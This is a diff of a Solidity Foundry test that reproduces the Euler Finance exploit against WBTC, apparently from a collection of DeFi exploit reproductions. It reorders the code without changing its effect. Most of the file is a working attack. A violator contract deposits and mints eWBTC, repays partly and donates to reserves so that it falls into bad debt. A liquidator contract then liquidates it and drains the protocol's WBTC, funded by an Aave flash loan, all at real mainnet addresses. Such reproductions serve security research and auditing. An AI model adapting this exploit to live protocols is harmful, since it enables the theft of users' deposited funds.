@@ -1,4 +1,4 @@
-//// SPDX-License-Identifier: UNLICENSED
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.0;
 
 import "forge-std/Test.sol";
@@ -7,72 +7,17 @@ import "forge-std/interfaces/IERC20.sol";
 // @Tx(One of the attack transactions)
 // https://etherscan.io/tx/0x71a908be0bef6174bccc3d493becdfd28395d78898e355d451cb52f7bac38617
 
-interface EToken {
-    function deposit(uint256 subAccountId, uint256 amount) external;
-    function mint(uint256 subAccountId, uint256 amount) external;
-    function donateToReserves(uint256 subAccountId, uint256 amount) external;
-    function withdraw(uint256 subAccountId, uint256 amount) external;
-}
-
-interface DToken {
-    function repay(uint256 subAccountId, uint256 amount) external;
-}
-
-interface IEuler {
-    struct LiquidationItems{
-        uint256 repay;
-        uint256 yield; 
-        uint256 healthScore; 
-        uint256 baseDiscount; 
-        uint256 discount;
-        uint256 conversionRate;
-    }
-
-    function checkLiquidation(address liquidator, address violator, address underlying, address collateral) external returns (LiquidationItems memory liqOpp);
-    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield) external; 
-}
-
-interface AAVE{
-    function flashLoan(
-        address receiverAddress,
-        address[] memory assets,
-        uint256[] memory amounts,
-        uint256[] memory modes,
-        address onBehalfOf,
-        bytes memory params,
-        uint16 referralCode
-    ) external;
-}
-
+/* ========== Basic Information ========== */
 abstract contract Base {
-    IERC20 internal  WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
-    EToken internal  eWBTC = EToken(0x0275b156cD77c5ed82D44bCc5f9E93eECff20138);
-    DToken internal  dWBTC = DToken(0x36c4A49F624342225bA45fcfc2e1A4BcBCDcE557);
-    IEuler internal   Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
-    AAVE internal  AaveV2 = AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
-    address internal  Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
+    IERC20 internal constant  WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
+    EToken internal constant  eWBTC = EToken(0x0275b156cD77c5ed82D44bCc5f9E93eECff20138);
+    DToken internal constant  dWBTC = DToken(0x36c4A49F624342225bA45fcfc2e1A4BcBCDcE557);
+    IEuler internal constant   Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
+    AAVE internal constant  AaveV2 = AAVE(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+    address internal constant  Euler_Protocol = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
 }
 
-contract IViolator is Base {
-    function violator() external {
-        WBTC.approve(Euler_Protocol, type(uint256).max);
-        eWBTC.deposit(0, 200_000_000_000);
-        eWBTC.mint(0, 2_000_000_000_000);
-        dWBTC.repay(0, 100_000_000_000);
-        eWBTC.mint(0, 2_000_000_000_000);
-        eWBTC.donateToReserves(0, 10_000_000_000_000_000_000_000);       
-    }
-}
-
-contract ILiquidator is Base {
-    function liquidate(address violator, address liquidator) external {
-            IEuler.LiquidationItems memory returnData = Euler.checkLiquidation(liquidator, violator, address(WBTC), address(WBTC));
-            Euler.liquidate(violator, address(WBTC), address(WBTC), returnData.repay, returnData.yield);
-            eWBTC.withdraw(0, WBTC.balanceOf(Euler_Protocol));
-            WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
-    }
-}
-
+/* ========== Attack Test ========== */
 contract ContractTest is Test, Base {
     IViolator violator;
     ILiquidator liquidator;
@@ -114,4 +59,65 @@ contract ContractTest is Test, Base {
             liquidator.liquidate(address(violator), address(liquidator));
             return true;
         } 
+}
+
+
+
+contract IViolator is Base {
+    function violator() external {
+        WBTC.approve(Euler_Protocol, type(uint256).max);
+        eWBTC.deposit(0, 200_000_000_000);
+        eWBTC.mint(0, 2_000_000_000_000);
+        dWBTC.repay(0, 100_000_000_000);
+        eWBTC.mint(0, 2_000_000_000_000);
+        eWBTC.donateToReserves(0, 10_000_000_000_000_000_000_000);       
+    }
+}
+
+contract ILiquidator is Base {
+    function liquidate(address violator, address liquidator) external {
+            IEuler.LiquidationItems memory returnData = Euler.checkLiquidation(liquidator, violator, address(WBTC), address(WBTC));
+            Euler.liquidate(violator, address(WBTC), address(WBTC), returnData.repay, returnData.yield);
+            eWBTC.withdraw(0, WBTC.balanceOf(Euler_Protocol));
+            WBTC.transfer(msg.sender, WBTC.balanceOf(address(this)));
+    }
+}
+
+
+/* ========== Interface ========== */
+interface EToken {
+    function deposit(uint256 subAccountId, uint256 amount) external;
+    function mint(uint256 subAccountId, uint256 amount) external;
+    function donateToReserves(uint256 subAccountId, uint256 amount) external;
+    function withdraw(uint256 subAccountId, uint256 amount) external;
+}
+
+interface DToken {
+    function repay(uint256 subAccountId, uint256 amount) external;
+}
+
+interface IEuler {
+    struct LiquidationItems{
+        uint256 repay;
+        uint256 yield; 
+        uint256 healthScore; 
+        uint256 baseDiscount; 
+        uint256 discount;
+        uint256 conversionRate;
+    }
+
+    function checkLiquidation(address liquidator, address violator, address underlying, address collateral) external returns (LiquidationItems memory liqOpp);
+    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield) external; 
+}
+
+interface AAVE{
+    function flashLoan(
+        address receiverAddress,
+        address[] memory assets,
+        uint256[] memory amounts,
+        uint256[] memory modes,
+        address onBehalfOf,
+        bytes memory params,
+        uint16 referralCode
+    ) external;
 }
